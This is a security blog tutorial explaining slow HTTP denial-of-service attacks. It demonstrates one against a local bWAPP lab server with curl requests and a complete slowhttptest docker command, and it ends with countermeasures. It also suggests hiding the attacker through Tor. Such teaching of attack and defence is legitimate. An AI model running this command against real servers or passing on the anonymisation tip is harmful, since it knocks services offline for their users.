---
slug: asymmetric-dos-slow-http-attack/
title: Asymmetric DoS, Slow HTTP Attack
date: 2018-11-15
category: attacks
subtitle: The story of David and Goliath
tags: security, vulnerability
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330667/blog/asymmetric-dos-slow-http-attack/cover_hdty39.webp
alt: greek statue with small angels.
description: Here you'll learn how a slow HTTP attack works,
  how to inspect HTTP requests and responses, and you'll see
  how to perform an asymmetric denial of service.
keywords: DoS, Vulnerability, Slowhttptest, Slow Body, HTTP,
  Asymmetric Attacks, Ethical Hacking, Pentesting
author: Kevin Amado
writer: kamadoatfluid
name: Kevin Amado
about1: Civil Engineer
about2: An algorithm must be seen to be believed, Donald Knuth
source: https://unsplash.com/photos/Wf2tCunxqQU
---

Have you ever heard the story of David and Goliath? David, a young boy,
goes out to confront a giant, named Goliath. David is the underdog in
this fight and is expected to lose. But, everyone underestimates David
and his prowess with a slingshot. When David ultimately kills Goliath,
he demonstrates that even a little guy can triumph over the biggest and
strongest of enemies.

Fine\! Today we are going to talk about unequal scenarios. Furthermore,
we are going to battle one ourselves.

## Let’s get started

So, let’s imagine, for a moment, that all you need to kill the giant,
that everyone fears, is a little slingshot, not a big mace, nor the
strength of a thousand men. Sound crazy? Well, it is. But it’s possible.

A cyber attack is considered "asymmetric" in the sense that you only
need a few resources, in this case, a laptop, in order to cause a
considerable amount of damage, malfunction or failure in the server. A
very real case of David vs. Goliath.

If we push hard enough, the server is going to stop providing the
service to other users, in other words, we will cause a *Denial of
Service* (DoS).

## How does a slow http attack work?

Imagine a line at the local fast food restaurant. A customer at the head
of the line can’t decide if he wants a burger or a hot-dog. People
behind him in line are getting mad; they aren’t getting their food
because he is holding up the whole line.

If you look at it in more detail, all this customer needed to do was to
"not know what to order". His indecision basically caused a denial of
service for every other person waiting behind him at the counter, i.e.,
A DoS.

Now imagine the same line, but the customer at the counter knows what he
wants to order, and he’s ordering a thousand burgers and a hundred
hot-dogs. Again, this means everyone behind him in line will have to
wait while his order is filled. The restaurant can take no more orders
until his is complete.

The HTTP protocol works similarly, it requires requests to be fully
received by the final user before they are processed.

Two things can happen, if a request is not completed, the server can
either wait or set the request as timed out after some few seconds.
However, if you let the request complete, but at a slow rate, then the
server will keep the resource busy waiting for the end of the data.

What would happen if the customer orders a thousand burgers and a
hundred hot-dogs, but he can’t decide which sauces and drinks to order
with them? And, to make matters worse, he seems to be intentionally
indecisive and he’s speaking very slowly.

The answer:

[D.o.S.](https://cwe.mitre.org/data/definitions/400.html)

This is exactly the idea behind a slow HTTP attack.

A web server keeps its active connections in a relatively small
connection pool. We will try to tie all the connections in this pool to
slow requests, making the server reject other users.

## Let’s do an HTTP request

First, let’s run a [bWAPP](http://www.itsecgames.com/) server on ip
*192.168.56.101*.

<div class="imgblock">

![bwapp-running](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330667/blog/asymmetric-dos-slow-http-attack/bwapp-running_lncq1r.webp)

<div class="title">

Figure 1. BWAPP server

</div>

</div>

For now, let’s assume that we are at:

**192.168.56.101/bWAPP/xss_post.php.**

And we entered in the form:

<div class="imgblock">

![xss-login-form](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330666/blog/asymmetric-dos-slow-http-attack/xss-login-form_gbaxlz.webp)

<div class="title">

Figure 2. XSS page and input

</div>

</div>

Once we access a page, the browser is going to ask the server for some
resources (images, texts, `HTML` pages, `CSS` and `JavaScript` files,
etc) and we can see these requests and responses from the command line
using `curl` (or Google Chrome, or Firefox, or `BURP`).

The process using *curl* is:

``` bash
$ # login to the server so we can see as a logged user the page we want
$ curl -L -c post_login_cookie 'http://192.168.56.101/bWAPP/login.php' \
--data 'login=bee&password=bug&security_level=0&form=submit'
$ # result: a file is saved with name 'post_login_cookie'
$
$ # submit a post request with the data we want on the field
$ curl -L -b post_login_cookie -v \
-d "firstname=test1&lastname=test2&form=submit" \
http://192.168.56.101/bWAPP/xss_post.php
$ # output is displayed to console, we'll see it in a moment
```

As mentioned before, every single resource is going to have a request
and a corresponding response. In other words, we are asking the server
for the *xss\_post.php* resource with the parameters:

**POST Parameters.**

``` bash
firstname=test1&lastname=test2&form=submit
```

Since we want to se an HTML page, *curl* asks for it:

**curl, server request output.**

``` bash
*   Trying 192.168.56.101...
* TCP_NODELAY set
* Connected to 192.168.56.101 (192.168.56.101) port 80 (#0)
> POST /bWAPP/xss_post.php HTTP/1.1
> Host: 192.168.56.101
> User-Agent: curl/7.58.0
> Accept: */*
> Cookie: PHPSESSID=5fvb1fr053gmc2f91ooicvf1f5; security_level=0
> Content-Length: 41
> Content-Type: application/x-www-form-urlencoded
```

And the server replies with:

**curl, server response output.**

``` bash
* upload completely sent off: 41 out of 41 bytes
< HTTP/1.1 200 OK
< Date: Thu, 15 Nov 2018 21:31:32 GMT
< Server: Apache/2.2.14 (Ubuntu) mod_mono/2.4.3 PHP/5.3.2-1ubuntu4.30 with
Suhosin-Patch proxy_html/3.0.1 mod_python/3.3.1 Python/2.6.5 mod_ssl/2.2.14
OpenSSL/0.9.8k Phusion_Passenger/4.0.38 mod_perl/2.0.4 Perl/v5.10.1
< X-Powered-By: PHP/5.3.2-1ubuntu4.30
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 11291
< Content-Type: text/html
```

At this point, nothing stops us from sending follow up headers with
random values:

**POST Parameters.**

``` bash
firstname=FASLDKJFEI&lastname=test2&form=submit
```

wait some seconds…​

**POST Parameters.**

``` bash
firstname=IEU182KSZ&lastname=test2&form=submit
```

And nothing stops us from simulating a slow connection on each one of
these requests, so the server is going to have to wait until we receive
the full resource.

Why not do a thousand requests until every single connection available
on the server pool is busy with us?

To do this, we are going to use a tool.

## Using slowhttptest

First, let’s pull the [slowhttptest docker
image](https://hub.docker.com/r/frapsoft/slowhttptest/) from the docker
hub.

**Bash command.**

``` bash
docker pull frapsoft/slowhttptest
```

And write the following command:

**Bash command.**

``` bash
sudo docker run --name DoSBWAPP --rm  frapsoft/slowhttptest \
-c 65539 -B -i 10 -l 300 -r 10000 -s 16384 -t firstname \
-u "http://192.168.56.101/bWAPP/xss_get.php" -x 10 -p 300
```

The parameters you see are described below:

<div class="tc">

**Table 1. Slowhttptest description**

</div>

|               |                                                                                                                 |
| ------------- | --------------------------------------------------------------------------------------------------------------- |
| \-c 65539     | use 65539 connections                                                                                           |
| \-B           | specify to slow down the http in message body mode                                                              |
| \-i 10        | seconds of interval between follow up data, per connection                                                      |
| \-l 300       | duration of the test in seconds                                                                                 |
| \-p 300       | timeout in seconds to wait for HTTP response on probe connection, after which server is considered inaccessible |
| \-r 10000     | connections per second                                                                                          |
| \-s 16384     | value of Content-Length header                                                                                  |
| \-x 10        | max length of follow up data in bytes                                                                           |
| \-t firstname | add ?firstname=(-x 10bytes) to the target url                                                                   |
| \-u URL       | target URL                                                                                                      |

While the attack is running a user that tries to access the service is
going to see:

<div class="imgblock">

![bwapp-while-attacking](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330664/blog/asymmetric-dos-slow-http-attack/bwapp-while-attacking_rqvn9n.webp)

<div class="title">

Figure 3. BWAPP is trying to connect without success

</div>

</div>

If the attack is long enough, it is going to get timed out:

<div class="imgblock">

![bwapp-timed-out](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330664/blog/asymmetric-dos-slow-http-attack/bwapp-timed-out_zqmfbc.webp)

<div class="title">

Figure 4. BWAPP gets timed-out

</div>

</div>

Once the attack is finished everything returns to a normal state:

<div class="imgblock">

![bwapp-attack-finished](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330666/blog/asymmetric-dos-slow-http-attack/bwapp-attack-finished_ka1ois.webp)

<div class="title">

Figure 5. BWAPP working normally after attacks

</div>

</div>

Since we only need a few resources (the internet and a laptop) we can
even do it on a low-bandwidth connection. Moreover, since we don’t need
too much bandwidth, we can pass everything through a proxy in the tor
network and hide ourselves.

## Sounds scary, how do I protect myself?

Counter-measures depend mainly on your service. Some useful mechanisms
to prevent this kind of attacks are:

- Limit the number of resources an unauthorized user can expend.

- Set the header and message body to a maximum reasonable length.

- Define a minimum incoming data rate, and drop those that are slower.

- Set an absolute connection timeout.

- Use a Web Application Firewall.

- Reject connections with verbs not supported by the URL.

In cases where you need to set minimum and maximum limits, it’s a good
idea to use the values from your statistics. If the value is too short,
you may risk dropping legitimate connections; if it is too long, you
won’t get any protection from attacks. Perhaps using a margin ranging
from one to two [standard
deviations](https://en.wikipedia.org/wiki/Normal_distribution#/media/File:Empirical_Rule.PNG)
may help you with this.

## Finally

I really hope that you liked this article.

I wish you a nice week, and will see you in another post\!

## References

1. Wikipedia (2018). 'Hypertext Transfer Protocol'.
    [Wiki](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol).

2. Sergey Shekyan (2018). 'Slowhttptest - Installation And Usage'.
    [Github
    wiki](https://github.com/shekyan/slowhttptest/wiki/InstallationAndUsage).

3. Sergey Shekyan (2018). 'Application Layer DoS attack simulator'.
    [Docker hub](https://blog.qualys.com/tag/slow-http-attack).
